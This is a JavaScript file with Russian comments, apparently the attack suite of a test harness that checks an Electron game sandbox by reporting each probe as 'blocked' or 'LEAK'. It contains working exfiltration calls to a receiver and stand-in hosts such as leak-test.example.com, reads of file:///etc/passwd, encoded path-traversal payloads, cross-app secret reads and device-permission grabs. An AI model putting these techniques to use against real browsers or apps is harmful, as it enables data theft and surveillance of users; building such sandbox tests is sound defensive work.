/* Атаки игры-взломщика. Сетевые атаки стучатся в приёмник, и истину о них знает приёмник,
   а не эта страница. Остальные атаки сами сообщают результат: blocked или LEAK. */
(function () {
  'use strict';
  var C = window.CFG;
  var base = 'http://' + C.host + ':' + C.http;
  var hit = function (name) { return base + '/hit/' + name + '?marker=' + C.marker; };
  var sleep = function (ms) { return new Promise(function (r) { setTimeout(r, ms); }); };
  var add = function (el) { (document.body || document.documentElement).appendChild(el); return el; };
  var make = function (tag, props) { return add(Object.assign(document.createElement(tag), props)); };

  /* Каждая атака должна дойти до приёмника, если защиты нет. Проверяется контрольным прогоном. */
  var NETWORK = {
    'fetch': function (u) { return fetch(u); },
    'fetch-nocors': function (u) { return fetch(u, { mode: 'no-cors' }); },
    'fetch-post': function (u) { return fetch(u, { method: 'POST', mode: 'no-cors', body: 'secret=' + C.marker }); },
    'xhr': function (u) { var x = new XMLHttpRequest(); x.open('GET', u); x.send(); },
    'img': function (u) { make('img', { src: u }); },
    'script': function (u) { make('script', { src: u }); },
    'stylesheet': function (u) { make('link', { rel: 'stylesheet', href: u }); },
    'css-background': function (u) { make('div', { innerHTML: '<span style="display:block;width:9px;height:9px;background:url(' + u + ')">x</span>' }); },
    'css-import': function (u) { make('style', { textContent: '@import url("' + u + '");' }); },
    'font': function (u) { return new FontFace('leak', 'url(' + u + ')').load(); },
    'iframe': function (u) { make('iframe', { src: u }); },
    'audio': function (u) { make('audio', { src: u, preload: 'auto' }); },
    'video': function (u) { make('video', { src: u, preload: 'auto' }); },
    'embed': function (u) { make('embed', { src: u, type: 'text/plain' }); },
    'beacon': function (u) { navigator.sendBeacon(u, 'secret=' + C.marker); },
    'eventsource': function (u) { var e = new EventSource(u); setTimeout(function () { e.close(); }, 2000); },
    'websocket': function (u) { new WebSocket(u.replace('http://', 'ws://')); },
    'worker-fetch': function (u) {
      var code = 'fetch(' + JSON.stringify(u) + ').catch(function(){})';
      new Worker(URL.createObjectURL(new Blob([code], { type: 'text/javascript' })));
    },
    'prefetch': function (u) { make('link', { rel: 'prefetch', href: u }); },
    'form-iframe': function (u) {
      make('iframe', { name: 'formtarget' });
      var f = make('form', { action: u, method: 'post', target: 'formtarget' });
      make('input', { name: 'secret', value: C.marker }); f.submit();
    },
  };

  function networkAttacks(R) {
    Object.keys(NETWORK).forEach(function (name) {
      try {
        var p = NETWORK[name](hit(name));
        if (p && p.catch) p.catch(function () {});
      } catch (e) { R['threw:' + name] = String(e); }
    });
    // Соединение без запроса: приёмник видит его на отдельном порту
    make('link', { rel: 'preconnect', href: 'http://' + C.host + ':' + C.tcp });
    // Адреса вне приёмника, их видит только захват трафика
    fetch('http://' + C.publicIp + '/hit/public-ip', { mode: 'no-cors' }).catch(function () {});
    fetch('http://leak-test.example.com/hit/dns', { mode: 'no-cors' }).catch(function () {});
    make('link', { rel: 'dns-prefetch', href: 'http://dns-prefetch.example.org' });
  }

  async function webrtc(R) {
    try {
      var pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:' + C.host + ':' + C.udp }] });
      var found = [];
      pc.onicecandidate = function (e) { if (e.candidate && e.candidate.candidate) found.push(e.candidate.candidate); };
      pc.createDataChannel('leak');
      await pc.setLocalDescription(await pc.createOffer());
      await sleep(2500);
      pc.close();
      // Настоящий IP в кандидате выдаёт адрес компьютера
      var ips = found.filter(function (c) { return /\b\d{1,3}(\.\d{1,3}){3}\b/.test(c); });
      R['webrtc-ip'] = ips.length ? 'LEAK: ' + ips[0] : 'blocked';
    } catch (e) { R['webrtc-ip'] = 'blocked'; }
  }

  async function read(url) {
    try {
      var r = await fetch(url);
      return { ok: r.ok, text: await r.text() };
    } catch (e) { return { ok: false, text: '' }; }
  }

  async function localAttacks(R) {
    // Контрольная проверка: свои файлы должны читаться, иначе песочница просто всё сломала
    var own = await read('own.txt');
    R['own-file'] = own.text.indexOf('own-file-ok') === 0 ? 'works' : 'BROKEN';

    var passwd = await read('file:///etc/passwd');
    var winIni = await read('file:///C:/Windows/win.ini');
    R['file-fetch'] = passwd.text.indexOf('root:') >= 0 || winIni.text.indexOf('[fonts]') >= 0 ? 'LEAK' : 'blocked';
    R['file-xhr'] = await new Promise(function (done) {
      try {
        var x = new XMLHttpRequest(); x.open('GET', 'file:///etc/passwd');
        x.onload = function () { done(x.responseText.indexOf('root:') >= 0 ? 'LEAK' : 'blocked'); };
        x.onerror = function () { done('blocked'); }; x.send();
      } catch (e) { done('blocked'); }
    });

    var paths = ['../manifest.json', '%2e%2e/manifest.json', '%2e%2e%2fmanifest.json', '..%5cmanifest.json',
      '%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd', '/etc/passwd', '//etc/passwd', 'manifest.json'];
    var escaped = [];
    for (var i = 0; i < paths.length; i++) {
      var got = await read(paths[i]);
      if (got.text.indexOf('publicKey') >= 0 || got.text.indexOf('root:') >= 0) escaped.push(paths[i]);
    }
    R['path-traversal'] = escaped.length ? 'LEAK: ' + escaped.join(' ') : 'blocked';

    var names = ['process', 'require', 'module', 'global', 'Buffer', 'electron', 'ipcRenderer', '__dirname'];
    var exposed = names.filter(function (n) { return typeof window[n] !== 'undefined'; });
    R['node-globals'] = exposed.length ? 'LEAK: ' + exposed.join(' ') : 'blocked';

    var secret = await read('kibgame://neighbour/secret.txt');
    R['neighbour-fetch'] = secret.text.indexOf(C.neighbourSecret) >= 0 ? 'LEAK' : 'blocked';
    var neighbourOwn = await read('kibgame://neighbour/index.html');
    R['neighbour-page'] = neighbourOwn.ok ? 'LEAK' : 'blocked';
    R['neighbour-storage'] = [localStorage.getItem('neighbour-secret'), sessionStorage.getItem('neighbour-secret')].some(Boolean) ? 'LEAK' : 'blocked';
    R['neighbour-iframe'] = await new Promise(function (done) {
      var f = make('iframe', { src: 'kibgame://neighbour/index.html' });
      setTimeout(function () {
        try { done(f.contentDocument && f.contentDocument.body && f.contentDocument.body.innerText.indexOf('соседняя') >= 0 ? 'LEAK' : 'blocked'); } catch (e) { done('blocked'); }
      }, 500);
    });

    try {
      await navigator.serviceWorker.register('attacks.js');
      R['service-worker'] = 'LEAK';
    } catch (e) { R['service-worker'] = 'blocked'; }
  }

  /* preconnect и dns-prefetch в списке нет: в Electron они не открывают соединений даже без защиты (проверено).
     Сами атаки остаются: если обновление Electron оживит канал, приёмник или захват трафика это заметят. */
  window.__channels = Object.keys(NETWORK).concat(['webrtc-udp', 'public-ip-packet']);

  window.__start = async function () {
    var R = {};
    networkAttacks(R);
    await webrtc(R);
    await localAttacks(R);
    await sleep(1000);
    return R;
  };

  /* Вызывается с признаком действия пользователя: без него браузер отказал бы и так, и тест был бы пустым. */
  window.__devices = async function () {
    var R = {};
    var denied = function (e) { return e && (e.name === 'NotAllowedError' || e.name === 'SecurityError'); };
    // Запрос без ответа не должен останавливать весь тест, а молчание не считается отказом
    var limited = function (p) {
      return Promise.race([p, new Promise(function (_r, no) { setTimeout(function () { var e = new Error('timeout'); e.name = 'Timeout'; no(e); }, 4000); })]);
    };
    var attempt = async function (name, fn) {
      try { var value = await limited(fn()); R[name] = value ? 'LEAK' : 'blocked'; } catch (e) { R[name] = denied(e) ? 'blocked' : 'CHECK: ' + e.name; }
    };
    await attempt('camera', function () { return navigator.mediaDevices.getUserMedia({ video: true }); });
    await attempt('microphone', function () { return navigator.mediaDevices.getUserMedia({ audio: true }); });
    await attempt('screen', function () { return navigator.mediaDevices.getDisplayMedia({ video: true }); });
    await attempt('clipboard', function () { return navigator.clipboard.readText().then(function () { return true; }); });
    await attempt('midi', function () { return navigator.requestMIDIAccess({ sysex: true }); });
    R.geolocation = await new Promise(function (done) {
      navigator.geolocation.getCurrentPosition(function () { done('LEAK'); }, function (e) { done(e.code === 1 ? 'blocked' : 'CHECK: code ' + e.code); }, { timeout: 2000 });
    });
    var pick = async function (name, api, method) {
      if (!api) { R[name] = 'blocked'; return; }
      try {
        var d = await limited(api[method]({ filters: [{ vendorId: 1 }] }));
        R[name] = d && (d.length === undefined || d.length) ? 'LEAK' : 'blocked';
      } catch (e) { R[name] = e.name === 'Timeout' ? 'CHECK: Timeout' : 'blocked'; }
    };
    await pick('usb', navigator.usb, 'requestDevice');
    await pick('hid', navigator.hid, 'requestDevice');
    await pick('serial', navigator.serial, 'requestPort');
    try {
      R.notification = (await limited(Notification.requestPermission())) === 'granted' ? 'LEAK' : 'blocked';
    } catch (e) { R.notification = 'blocked'; }
    return R;
  };

  /* Каждая атака уводит окно или открывает новое, поэтому стенд запускает их по одной. */
  window.__navigate = function (name) {
    var u = hit(name);
    var actions = {
      'nav-location': function () { location.href = u; },
      'nav-meta-refresh': function () { make('meta', { httpEquiv: 'refresh', content: '0;url=' + u }); },
      'nav-form': function () { make('form', { action: u, method: 'get' }).submit(); },
      'nav-open': function () { window.open(u); },
      'nav-anchor-blank': function () { make('a', { href: u, target: '_blank' }).click(); },
      'nav-file': function () { location.href = 'file:///etc/passwd'; },
      'nav-file-open': function () { window.open('file:///etc/passwd'); },
      'nav-mailto': function () { location.href = 'mailto:leak@example.com?body=' + C.marker; },
      'nav-custom-protocol': function () { location.href = 'kibleak://run/' + C.marker; },
      'nav-register-protocol': function () { navigator.registerProtocolHandler('web+leak', location.origin + '/?%s'); },
      'nav-download': function () {
        make('a', { href: URL.createObjectURL(new Blob(['secret'])), download: 'leak.txt' }).click();
      },
    };
    actions[name]();
    return true;
  };

  /* Метка во всех хранилищах: потом её ищут на диске. */
  window.__writeStorage = async function () {
    var M = C.marker;
    sessionStorage.setItem('mark', M);
    localStorage.setItem('mark', M);
    try { document.cookie = 'mark=' + M + '; max-age=86400'; } catch (e) { /* схема без cookie */ }
    await new Promise(function (done) {
      var open = indexedDB.open('marks', 1);
      open.onupgradeneeded = function () { open.result.createObjectStore('s'); };
      open.onerror = function () { done(); };
      open.onsuccess = function () {
        var tx = open.result.transaction('s', 'readwrite');
        tx.objectStore('s').put(M, 'mark');
        tx.oncomplete = function () { open.result.close(); done(); };
        tx.onerror = function () { done(); };
      };
    });
    return true;
  };

  window.__readStorage = async function () {
    var idb = await new Promise(function (done) {
      var open = indexedDB.open('marks', 1);
      open.onupgradeneeded = function () { open.result.createObjectStore('s'); };
      open.onerror = function () { done(null); };
      open.onsuccess = function () {
        var get = open.result.transaction('s').objectStore('s').get('mark');
        get.onsuccess = function () { open.result.close(); done(get.result || null); };
        get.onerror = function () { done(null); };
      };
    });
    return { session: sessionStorage.getItem('mark'), local: localStorage.getItem('mark'), indexed: idb };
  };
})();
